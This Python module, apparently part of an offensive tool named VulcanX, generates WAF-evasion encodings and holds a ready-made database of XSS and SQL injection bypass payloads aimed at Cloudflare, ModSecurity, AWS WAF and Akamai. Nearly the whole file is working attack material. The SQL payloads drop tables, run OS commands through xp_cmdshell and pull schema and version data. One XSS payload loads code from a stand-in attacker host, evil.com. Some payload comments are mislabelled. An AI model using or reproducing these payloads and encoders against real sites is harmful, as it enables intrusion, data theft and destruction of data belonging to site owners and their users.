"""
waf_bypass.py - WAF Evasion Payload Generator for VulcanX
Provides encoding techniques and pre-built bypass payloads
for popular WAF vendors (Cloudflare, ModSecurity, AWS WAF, Akamai).
"""

import re
import base64
import urllib.parse
from typing import Literal


XSS_TECHNIQUES = Literal[
    'unicode', 'html_entity', 'double_encode', 'case_variation',
    'comment_injection'
]
SQLI_TECHNIQUES = Literal[
    'comment_inline', 'case', 'whitespace_substitute', 'hex_encode'
]


class WAFBypass:
    """
    WAF evasion helper that generates encoded payloads and curated
    bypass sets for well-known WAF vendors.
    """

    # ------------------------------------------------------------------
    # XSS encoders
    # ------------------------------------------------------------------

    @staticmethod
    def _unicode_encode(payload: str) -> str:
        """Encode each character as a JS \\uXXXX unicode escape."""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)

    @staticmethod
    def _html_entity_encode(payload: str) -> str:
        """Encode alphanumeric chars as HTML decimal entities."""
        result = []
        for c in payload:
            if c.isalnum():
                result.append(f'&#{ord(c)};')
            else:
                result.append(c)
        return ''.join(result)

    @staticmethod
    def _double_url_encode(payload: str) -> str:
        """Apply URL-encoding twice."""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')

    @staticmethod
    def _case_variation(payload: str) -> str:
        """Alternate upper/lower case of alphabetic characters."""
        result = []
        upper = True
        for c in payload:
            if c.isalpha():
                result.append(c.upper() if upper else c.lower())
                upper = not upper
            else:
                result.append(c)
        return ''.join(result)

    @staticmethod
    def _comment_injection(payload: str) -> str:
        """Insert HTML/JS comment breaks between keyword letters."""
        # Insert /**/ between each character of keywords
        keywords = ['script', 'alert', 'onerror', 'onload', 'svg']
        result = payload
        for kw in keywords:
            broken = '/**/'.join(kw)
            result = re.sub(re.escape(kw), broken, result, flags=re.IGNORECASE)
        return result

    # ------------------------------------------------------------------
    # SQLi encoders
    # ------------------------------------------------------------------

    @staticmethod
    def _sqli_comment_inline(payload: str) -> str:
        """Insert inline SQL comments to break keyword signatures."""
        keywords = ['SELECT', 'UNION', 'WHERE', 'FROM', 'AND', 'OR',
                    'INSERT', 'UPDATE', 'DELETE', 'DROP', 'TABLE']
        result = payload
        for kw in keywords:
            broken = '/*!'.join(kw) + '*/'
            result = re.sub(re.escape(kw), broken,
                            result, flags=re.IGNORECASE)
        return result

    @staticmethod
    def _sqli_case(payload: str) -> str:
        """Alternate case on SQL keywords."""
        return WAFBypass._case_variation(payload)

    @staticmethod
    def _sqli_whitespace_substitute(payload: str) -> str:
        """Replace spaces with alternative whitespace / comment tokens."""
        substitutes = ['\t', '\n', '/**/', '%09', '%0a', '%0d%0a']
        # Rotate through substitutes
        result = []
        idx = 0
        for c in payload:
            if c == ' ':
                result.append(substitutes[idx % len(substitutes)])
                idx += 1
            else:
                result.append(c)
        return ''.join(result)

    @staticmethod
    def _sqli_hex_encode(payload: str) -> str:
        """Convert string literals in payload to 0x hex notation."""
        def to_hex(match: re.Match) -> str:
            s = match.group(1)
            hexval = s.encode().hex()
            return f"0x{hexval}"

        return re.sub(r"'([^']*)'", to_hex, payload)

    # ------------------------------------------------------------------
    # Public encoding methods
    # ------------------------------------------------------------------

    def encode_xss(self, payload: str, technique: str) -> str:
        """
        Apply an XSS evasion encoding technique to *payload*.

        Args:
            payload:   Raw XSS payload string.
            technique: One of 'unicode', 'html_entity', 'double_encode',
                       'case_variation', 'comment_injection'.

        Returns:
            Encoded payload string.

        Raises:
            ValueError: If *technique* is not recognised.
        """
        dispatch = {
            'unicode': self._unicode_encode,
            'html_entity': self._html_entity_encode,
            'double_encode': self._double_url_encode,
            'case_variation': self._case_variation,
            'comment_injection': self._comment_injection,
        }
        if technique not in dispatch:
            raise ValueError(
                f"Unknown XSS technique '{technique}'. "
                f"Valid: {list(dispatch)}"
            )
        return dispatch[technique](payload)

    def encode_sqli(self, payload: str, technique: str) -> str:
        """
        Apply a SQL injection evasion encoding technique to *payload*.

        Args:
            payload:   Raw SQLi payload string.
            technique: One of 'comment_inline', 'case',
                       'whitespace_substitute', 'hex_encode'.

        Returns:
            Encoded payload string.

        Raises:
            ValueError: If *technique* is not recognised.
        """
        dispatch = {
            'comment_inline': self._sqli_comment_inline,
            'case': self._sqli_case,
            'whitespace_substitute': self._sqli_whitespace_substitute,
            'hex_encode': self._sqli_hex_encode,
        }
        if technique not in dispatch:
            raise ValueError(
                f"Unknown SQLi technique '{technique}'. "
                f"Valid: {list(dispatch)}"
            )
        return dispatch[technique](payload)

    # ------------------------------------------------------------------
    # Curated bypass sets
    # ------------------------------------------------------------------

    # Structure: bypass_db[waf_vendor][vuln_type] = [payload, ...]
    _BYPASS_DB: dict[str, dict[str, list[str]]] = {

        'cloudflare': {
            'xss': [
                # 1 – Template literal / backtick
                '<svg/onload=`alert\u00281\u0029`>',
                # 2 – HTML entity encoding
                '&#x3C;img src=x onerror=&#x61;lert(1)&#x3E;',
                # 3 – SVG with encoded event
                '<svg><script>alert&#40;1&#41;</script>',
                # 4 – Double URL encoding
                '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
                # 5 – Null byte injection
                '<scr\x00ipt>alert(1)</scr\x00ipt>',
                # 6 – Unicode fullwidth chars
                '\uff1cscript\uff1ealert(1)\uff1c/script\uff1e',
                # 7 – CSS expression (legacy IE)
                '<div style="width:expression(alert(1))">',
                # 8 – JavaScript protocol in href
                '<a href="javascript&#58;alert(1)">click</a>',
                # 9 – Data URI with base64
                '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
                # 10 – Comment-injected script tag
                '<s<!---->cript>alert(1)</s<!---->cript>',
                # 11 – onmouseover with encoded parens
                '<img src=x onmouseover=alert\u00281\u0029>',
                # 12 – HTML5 event in video tag
                '<video src=1 onerror=alert(1)>',
            ],
            'sqli': [
                "' OR '1'='1",
                "' OR 1=1--",
                "1' AND SLEEP(5)--",
                "1 UNION SELECT null,null,null--",
                "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
                "1;DROP TABLE users--",
                "' OR EXISTS(SELECT * FROM users)--",
                "1 AND 1=1",
                "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
                "1' ORDER BY 1--",
            ],
        },

        'modsecurity': {
            'xss': [
                # comment-broken script tag
                '<scr/**/ipt>alert(1)</scr/**/ipt>',
                # hex-encoded javascript: in href
                '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">x</a>',
                # newline-split event handler
                '<img src=x\nonerror=alert(1)>',
                # tab-split event handler
                '<img src=x\tonerror=alert(1)>',
                # form with autofocus
                '<form><input autofocus onfocus=alert(1)>',
                # details/summary HTML5
                '<details open ontoggle=alert(1)>',
                # srcdoc iframe
                '<iframe srcdoc="<script>alert(1)</script>">',
                # object tag
                '<object data="javascript:alert(1)">',
                # math element (MathML)
                '<math><mtext></mtext><script>alert(1)</script></math>',
                # template tag (Chrome)
                '<template><script>alert(1)</script></template>',
                # marquee onstart
                '<marquee onstart=alert(1)>text</marquee>',
                # body onpageshow
                '<body onpageshow=alert(1)>',
            ],
            'sqli': [
                "1 /*!UNION*/ /*!SELECT*/ null,null--",
                "1'/*!50000 AND*/1=1--",
                "1/**/UNION/**/SELECT/**/null--",
                "1 AND 1=1#",
                "' OR/**/1=1--",
                "1;EXEC xp_cmdshell('whoami')--",
                "' OR 1=1 LIMIT 1--",
                "1 AND SUBSTRING(@@version,1,1)='5'",
                "1 UNION SELECT table_name FROM information_schema.tables--",
                "' OR SLEEP(5)--",
                "1 AND (SELECT COUNT(*) FROM users)>0--",
                "' OR '1'='1'/*",
            ],
        },

        'aws_waf': {
            'xss': [
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
                "<svg onload=setTimeout('ale'+'rt(1)',0)>",
                '<a href=x onclick=window[`al`+`ert`](1)>click</a>',
                '<body/onload=document.write("<script>alert(1)<\\/script>")>',
                '<input onfocus=Function`alert\x281\x29`() autofocus>',
                '<script>({}).constructor.constructor("alert(1)")()</script>',
                '<script>\u0061\u006c\u0065\u0072\u0074(1)</script>',
                '<img src="x" onerror="this[\'ale\'+\'rt\'](1)">',
                '<iframe onload=top.alert(1)>',
                '<video><source onerror=alert(1)>',
                '<button formaction=javascript:alert(1)>x</button>',
            ],
            'sqli': [
                "1' AND '1'='1",
                "1 OR 0x31=0x31--",
                "' UNION SELECT 0x61646d696e--",
                "1 AND BENCHMARK(5000000,MD5(1))--",
                "' OR ASCII(SUBSTR(version(),1,1))>50--",
                "1;SELECT IF(1=1,SLEEP(5),0)--",
                "' OR LENGTH(database())>0--",
                "1 UNION SELECT user(),2,3--",
                "' OR (SELECT 1 FROM dual)='1",
                "1 AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
                "' UNION SELECT NULL FROM DUAL--",
            ],
        },

        'akamai': {
            'xss': [
                # Encoded angle brackets via overlong UTF-8 (header bypass)
                '<IMG SRC=# STYLE="xss:expression(alert(1))">',
                '<LINK REL="stylesheet" HREF="javascript:alert(1)">',
                # VBScript (legacy)
                '<img src="" dynsrc="javascript:alert(1)">',
                # XML namespace
                '<html xmlns:xss><?import namespace="xss" implementation="http://evil.com/xss.htc"><xss:xss>alert(1)</xss:xss></html>',
                # CSS @import
                "<style>@import'javascript:alert(1)';</style>",
                # expression via filter
                '<div style="background-image:url(javascript:alert(1))">',
                # Encode using JSFuck
                '<script>[+[]]+[+!+[]]</script>',
                # DOM clobbering
                '<form id=x><input id=y name=action value=x>',
                # base href redirect
                '<base href="javascript:alert(1)//">',
                # polyglot
                'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html onerror="/**/(alert)(1)">',
                # srcdoc with encoding
                '<iframe srcdoc="&#60;script&#62;alert(1)&#60;/script&#62;">',
                # ping attribute
                '<a href=x ping=javascript:alert(1)>click</a>',
            ],
            'sqli': [
                "1%20AND%201%3D1--",
                "' OR%201%3D1--",
                "1%09UNION%09SELECT%09NULL--",
                "1%0AUNION%0ASELECT%0ANULL--",
                "';WAITFOR DELAY '0:0:5'--",
                "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' OR 1 IN (SELECT 1)--",
                "1 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--",
                "1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--",
            ],
        },
    }

    def get_bypass_set(self, waf_vendor: str, vuln_type: str) -> list[str]:
        """
        Return a curated list of WAF bypass payloads for the given vendor
        and vulnerability type.

        Args:
            waf_vendor: One of 'cloudflare', 'modsecurity', 'aws_waf', 'akamai'.
            vuln_type:  One of 'xss', 'sqli'.

        Returns:
            List of payload strings.  Empty list if combination is unknown.
        """
        vendor_lower = waf_vendor.lower().replace('-', '_').replace(' ', '_')
        vuln_lower = vuln_type.lower()
        vendor_db = self._BYPASS_DB.get(vendor_lower, {})
        return list(vendor_db.get(vuln_lower, []))

    def list_vendors(self) -> list[str]:
        """Return all supported WAF vendors."""
        return list(self._BYPASS_DB.keys())

    def list_techniques_xss(self) -> list[str]:
        """Return supported XSS encoding technique names."""
        return ['unicode', 'html_entity', 'double_encode',
                'case_variation', 'comment_injection']

    def list_techniques_sqli(self) -> list[str]:
        """Return supported SQLi encoding technique names."""
        return ['comment_inline', 'case', 'whitespace_substitute', 'hex_encode']
